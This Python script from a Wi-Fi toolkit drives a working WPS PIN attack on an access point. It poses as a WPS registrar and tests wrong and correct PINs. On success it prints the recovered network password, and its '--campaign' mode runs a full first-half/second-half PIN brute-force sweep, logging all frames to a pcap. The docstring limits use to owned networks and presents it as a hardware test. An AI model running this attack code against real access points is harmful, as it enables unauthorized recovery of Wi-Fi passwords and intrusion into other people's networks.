"""WPS PIN attempt probe (hardware ground truth for the WSC registrar).

Everything below the radio is offline-verified (wsc_crypto / messages /
registrar, with a fake-enrollee proving both outcome paths). The only unknown
left is whether a REAL AP's WSC stack accepts our M2/M4/M6 and walks the
exchange, which you can't answer offline. This probe associates to one AP and
runs PIN attempt(s) end to end, logging the headline lines and dumping every
RX frame to a .pcap for analysis.

Default target = data_dumps/wps_pin.txt (your AirLink test box). With no --pin
it runs TWO attempts against the known PIN:
  1. a deliberately-WRONG pin (correct first half, corrupted second half) →
     expect "WPS PIN ........ incorrect" detected after the M6 NACK, which also
     proves the first half was accepted (M5 received).
  2. the correct PIN → expect "WPS PIN ........ CORRECT, PASSWORD: ........"
     extracted from M7.

This TRANSMITS (auth/assoc + EAPOL). Run it only against a network you own.

Usage (at the box):
    uv run python scripts/wps/wps_probe.py
    uv run python scripts/wps/wps_probe.py --pin 01030365          # single PIN
    uv run python scripts/wps/wps_probe.py --bssid AA:.. --ssid X --channel 1
    # add --debug for verbose USB/driver logs
"""
from __future__ import annotations

import argparse
import asyncio
import logging
import struct
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

from wifit3.campaigns.auth_assoc import Association, WlanTransport, str_to_mac
from wifit3.dot11.wsc.assoc_ie import WPS_REQ_REGISTRAR, wps_assoc_ie
from wifit3.campaigns.wps.registrar import PinResult, WpsRegistrar
from wifit3.wlan.manager import WlanDeviceManager


def step(label: str) -> None:
    print(f"\n--- {label} ---")


def ok(msg: str) -> None:
    print(f"[PASS] {msg}")


def info(msg: str) -> None:
    print(f"  {msg}")


def fail(msg: str) -> None:
    print(f"[FAIL] {msg}")
    sys.exit(1)


def mac_str(b: bytes) -> str:
    return ":".join(f"{x:02x}" for x in b)


_LINKTYPE_IEEE802_11 = 105


def write_pcap(path: Path, frames: list) -> int:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("wb") as f:
        f.write(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, _LINKTYPE_IEEE802_11))
        for ts, frame in frames:
            sec = int(ts)
            usec = int((ts - sec) * 1_000_000)
            f.write(struct.pack("<IIII", sec, usec, len(frame), len(frame)))
            f.write(frame)
    return len(frames)


def load_default_target() -> dict:
    """Parse data_dumps/wps_pin.txt (gitignored): SSID/BSSID/Channel/PIN/PW."""
    path = Path(__file__).parent.parent.parent / "data_dumps" / "wps_pin.txt"
    out: dict = {}
    if not path.exists():
        return out
    for line in path.read_text().splitlines():
        if ":" not in line:
            continue
        k, _, v = line.partition(":")
        out[k.strip().lower()] = v.strip()
    return out


def derive_wrong_pin(pin: str) -> str:
    """Keep the first half correct, corrupt the second half, so the attempt
    reaches M5 (first half accepted) then NACKs at M6 (second half wrong)."""
    if len(pin) != 8 or not pin.isdigit():
        return "00000000" if pin != "00000000" else "11111111"
    last = pin[-1]
    flipped = "0" if last != "0" else "1"
    return pin[:7] + flipped


async def discover_iface(debug: bool, card: str = ""):
    mgr = WlanDeviceManager()
    ifaces = await mgr.refresh()
    if not ifaces:
        fail("No supported wifit3 card found. Plug it in (Zadig→WinUSB on Windows) and retry.")
    if card:
        matches = [i for i in ifaces
                   if card.lower() in f"{i.name} {i.description}".lower()]
        if not matches:
            found = ", ".join(i.name for i in ifaces)
            fail(f"No card matches '{card}'. Found: {found}")
        iface = matches[0]
    else:
        iface = ifaces[0]
    info(f"Using {iface.name}: {iface.description}")
    if not await iface.connect(progress_cb=lambda p, m: None):
        fail("Driver connect() failed. Replug and retry.")
    return mgr, iface


async def find_ap(iface, channel: int, bssid: str | None, ssid: str | None, scan_s: float):
    step(f"Park on channel {channel}, find the AP")
    if not await iface.set_channel(channel):
        fail(f"set_channel({channel}) failed.")
    deadline = time.time() + scan_s
    while time.time() < deadline:
        for ap in iface.get_access_points():
            if bssid and ap.bssid.lower() != bssid.lower():
                continue
            if ssid and (ap.ssid or "") != ssid:
                continue
            if bssid or ssid:
                info(f"Target: {ap.bssid}  ssid={ap.ssid!r}  enc={ap.encryption}  "
                     f"wps={'locked' if ap.wps_locked else ap.wps}")
                return ap
        await asyncio.sleep(0.5)
    info(f"[warn] AP not seen in scan ({scan_s:.0f}s), proceeding with the named "
         "BSSID/SSID/channel anyway (beacons may just be missed).")
    return None


async def run_one_attempt(iface, bssid: str, ssid: str, channel: int, our_mac: bytes,
                          pin: str, expect: str, capture: list) -> None:
    step(f"Attempt PIN {pin}  (expect: {expect})")
    assoc = Association(iface, bssid, ssid, channel, our_mac=our_mac,
                        assoc_trailer_ies=wps_assoc_ie(WPS_REQ_REGISTRAR))
    assoc.start()
    # Record our TX frames into the same capture list as RX → full-conversation pcap.
    transport = WlanTransport(iface, str_to_mac(bssid), our_mac,
                              tx_observer=lambda fr: capture.append((time.time(), bytes(fr))))
    try:
        if not await assoc.associate():
            info(f"[warn] association failed ({assoc.fail_reason}); running the "
                 "EAPOL exchange anyway in case the AP engages.")
        else:
            ok(f"Associated as {mac_str(our_mac)}")
        transport.start()
        reg = WpsRegistrar(transport, str_to_mac(bssid), our_mac, log=lambda m: print(f"    {m}"))
        outcome = await reg.try_pin(pin)
    finally:
        transport.stop()
        assoc.stop()

    r = outcome.result
    if r is PinResult.SUCCESS:
        ok(f"WPS PIN {pin} CORRECT, PASSWORD: {outcome.psk}   (SSID={outcome.ssid!r})")
    elif r is PinResult.FIRST_HALF_WRONG:
        ok(f"WPS PIN {pin} incorrect  [first half wrong] ({outcome.detail})")
    elif r is PinResult.SECOND_HALF_WRONG:
        ok(f"WPS PIN {pin} incorrect  [first half OK, second half wrong] ({outcome.detail})")
    elif r is PinResult.TIMEOUT:
        info(f"TIMEOUT: no usable EAP/WSC response ({outcome.detail}). See pcap.")
    else:
        info(f"PROTO_ERROR: AP rejected setup before answering the PIN ({outcome.detail}); "
             "possibly WPS-locked. See pcap.")
    info(f"({len(capture)} frames captured so far)")


async def main_async(args) -> int:
    defaults = load_default_target()
    bssid = args.bssid or defaults.get("bssid")
    ssid = args.ssid if args.ssid is not None else defaults.get("ssid", "")
    channel = args.channel or int(defaults.get("channel", "1"))
    known_pin = args.pin or defaults.get("pin")
    if not bssid:
        fail("No target BSSID (give --bssid or populate data_dumps/wps_pin.txt).")
    if not known_pin:
        fail("No PIN to try (give --pin or populate data_dumps/wps_pin.txt).")

    mgr, iface = await discover_iface(args.debug)
    capture: list = []
    iface.register_rx_callback(lambda pkt: capture.append((time.monotonic(), pkt.raw)))
    our_mac = bytes([0x02, 0xAA, 0xBB]) + struct.pack(">I", int(time.time()))[1:]
    try:
        found_ap = await find_ap(iface, channel, bssid, ssid, args.scan_secs)

        if args.campaign:
            from types import SimpleNamespace

            from wifit3.campaigns.pin import WpsCampaign
            target = found_ap or SimpleNamespace(bssid=bssid, ssid=ssid,
                                                 channel=channel, wps_locked=False)
            step(f"Run full WpsCampaign (up to {args.max_secs:.0f}s)")
            camp = WpsCampaign(iface, target, log=lambda m: print(f"    {m}"))
            camp.start()
            end = time.time() + args.max_secs
            while time.time() < end and camp.status in ("idle", "running", "paused", "locked"):
                await asyncio.sleep(0.5)
            await camp.stop()
            step("Results")
            if camp.state.found_pin:
                ok(f"WPS PIN {camp.state.found_pin} CORRECT, PASSWORD: {camp.state.found_psk}")
            else:
                info(f"status={camp.status} attempts={camp.state.attempts} "
                     f"tested={camp.state.tested} phase={camp.state.phase} "
                     f"first_half={camp.state.first_half} "
                     f"eta~{(camp.eta_seconds or 0)/60:.0f}min "
                     f"(eta ignores lockout backoffs)")
            write_pcap(Path(args.out), capture)
            return 0

        if args.pin:
            attempts = [(args.pin, "as given")]
        else:
            attempts = [
                (derive_wrong_pin(known_pin), "incorrect: second half wrong"),
                (known_pin, "CORRECT: should reveal PSK"),
            ]
        for i, (pin, expect) in enumerate(attempts):
            await run_one_attempt(iface, bssid, ssid, channel, our_mac, pin, expect, capture)
            if i + 1 < len(attempts):
                info(f"Re-associating for next attempt in {args.attempt_gap:.0f}s …")
                await asyncio.sleep(args.attempt_gap)

        step("Results")
        out = Path(args.out)
        n = write_pcap(out, capture)
        ok(f"Captured {n} frames → {out}  (read it to confirm the M1..M7 exchange)")
        return 0
    finally:
        step("Release device")
        await mgr.close_all()
        info("Closed.")


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    p.add_argument("--bssid", help="target AP BSSID (default: data_dumps/wps_pin.txt)")
    p.add_argument("--ssid", help="target AP SSID (default: from wps_pin.txt)")
    p.add_argument("--channel", type=int, help="target channel (default: from wps_pin.txt)")
    p.add_argument("--pin", help="try a single specific 8-digit PIN instead of the wrong+correct pair")
    p.add_argument("--campaign", action="store_true",
                   help="run the full WpsCampaign sweep (COMMON->first-half->second-half) instead of the probe pair")
    p.add_argument("--max-secs", type=float, default=120.0, help="campaign time budget")
    p.add_argument("--scan-secs", type=float, default=6.0)
    p.add_argument("--attempt-gap", type=float, default=3.0, help="delay between the two attempts")
    p.add_argument("--out", default="wifit3-wps-probe.pcap", help="pcap output path")
    p.add_argument("--debug", action="store_true", help="verbose USB/driver logs")
    args = p.parse_args()

    # Windows consoles default to cp1252; our status lines use arrows/dashes.
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(encoding="utf-8")
        except Exception:
            pass

    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.INFO,
        format="%(asctime)s %(levelname)s %(name)s: %(message)s",
    )
    if not args.debug:
        logging.getLogger("wifit3").setLevel(logging.INFO)
    try:
        return asyncio.run(main_async(args))
    except KeyboardInterrupt:
        print("\nInterrupted.")
        return 130


if __name__ == "__main__":
    sys.exit(main())
